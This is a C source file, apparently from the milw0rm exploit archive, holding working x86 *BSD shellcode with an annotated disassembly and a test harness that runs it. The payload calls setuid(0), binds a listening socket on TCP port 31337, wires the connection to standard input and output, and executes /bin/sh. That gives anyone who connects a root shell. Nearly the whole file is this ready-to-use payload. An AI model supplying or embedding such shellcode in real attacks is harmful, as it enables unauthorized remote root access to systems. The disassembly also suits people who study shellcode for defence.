/*
 * $Id: portbind-bsd.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
 *
 * portbind-bsd.c - setuid/portbind shellcode for *BSD/x86
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Simple portbind shellcode that bind()'s a setuid(0) shell on
 * port 31337/tcp (based on bighawk's code).
 *
 * Tested on OpenBSD and FreeBSD.
 */

/*
 * setuid(0)
 *
 * 20c8:       31 c0                   xor    %eax,%eax
 * 20ca:       50                      push   %eax
 * 20cb:       50                      push   %eax
 * 20cc:       b0 17                   mov    $0x17,%al
 * 20ce:       cd 80                   int    $0x80
 *
 * socket(AF_INET, SOCK_STREAM, 0)
 *
 * 20d0:       31 c9                   xor    %ecx,%ecx
 * 20d2:       f7 e1                   mul    %ecx,%eax
 * 20d4:       51                      push   %ecx
 * 20d5:       41                      inc    %ecx
 * 20d6:       51                      push   %ecx
 * 20d7:       41                      inc    %ecx
 * 20d8:       51                      push   %ecx
 * 20d9:       51                      push   %ecx
 * 20da:       b0 61                   mov    $0x61,%al
 * 20dc:       cd 80                   int    $0x80
 *
 * bind(s, server, sizeof(server))
 *
 * 20de:       89 c3                   mov    %eax,%ebx
 * 20e0:       52                      push   %edx
 * 20e1:       66 68 7a 69             pushw  $0x697a
 * 20e5:       66 51                   push   %cx
 * 20e7:       89 e6                   mov    %esp,%esi
 * 20e9:       b1 10                   mov    $0x10,%cl
 * 20eb:       51                      push   %ecx
 * 20ec:       56                      push   %esi
 * 20ed:       50                      push   %eax
 * 20ee:       50                      push   %eax
 * 20ef:       b0 68                   mov    $0x68,%al
 * 20f1:       cd 80                   int    $0x80
 *
 * listen(s, 1)
 *
 * 20f3:       51                      push   %ecx
 * 20f4:       53                      push   %ebx
 * 20f5:       53                      push   %ebx
 * 20f6:       b0 6a                   mov    $0x6a,%al
 * 20f8:       cd 80                   int    $0x80
 *
 * accept(s, 0, 0)
 *
 * 20fa:       52                      push   %edx
 * 20fb:       52                      push   %edx
 * 20fc:       53                      push   %ebx
 * 20fd:       53                      push   %ebx
 * 20fe:       b0 1e                   mov    $0x1e,%al
 * 2100:       cd 80                   int    $0x80
 *
 * dup2(c, 2)
 * dup2(c, 1)
 * dup2(c, 0)
 *
 * 2102:       b1 03                   mov    $0x3,%cl
 * 2104:       89 c3                   mov    %eax,%ebx
 * 2106:       b0 5a                   mov    $0x5a,%al
 * 2108:       49                      dec    %ecx
 * 2109:       51                      push   %ecx
 * 210a:       53                      push   %ebx
 * 210b:       53                      push   %ebx
 * 210c:       cd 80                   int    $0x80
 * 210e:       41                      inc    %ecx
 * 210f:       e2 f5                   loop   2106 <_sc+0x3e>
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 2111:       51                      push   %ecx
 * 2112:       68 2f 2f 73 68          push   $0x68732f2f
 * 2117:       68 2f 62 69 6e          push   $0x6e69622f
 * 211c:       89 e3                   mov    %esp,%ebx
 * 211e:       51                      push   %ecx
 * 211f:       54                      push   %esp
 * 2120:       53                      push   %ebx
 * 2121:       53                      push   %ebx
 * 2122:       b0 3b                   mov    $0x3b,%al
 * 2124:       cd 80                   int    $0x80
 */

char sc[] = /* 8 + 86 = 94 bytes */
"\x31\xc0\x50\x50\xb0\x17\xcd\x80"
"\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80"
"\x89\xc3\x52\x66\x68"
"\x7a\x69" // port 31337/tcp, change if needed
"\x66\x51\x89\xe6\xb1\x10\x51\x56\x50\x50\xb0\x68\xcd\x80"
"\x51\x53\x53\xb0\x6a\xcd\x80"
"\x52\x52\x53\x53\xb0\x1e\xcd\x80"
"\xb1\x03\x89\xc3\xb0\x5a\x49\x51\x53\x53\xcd\x80"
"\x41\xe2\xf5\x51\x68//sh\x68/bin\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}

// milw0rm.com [2006-07-20]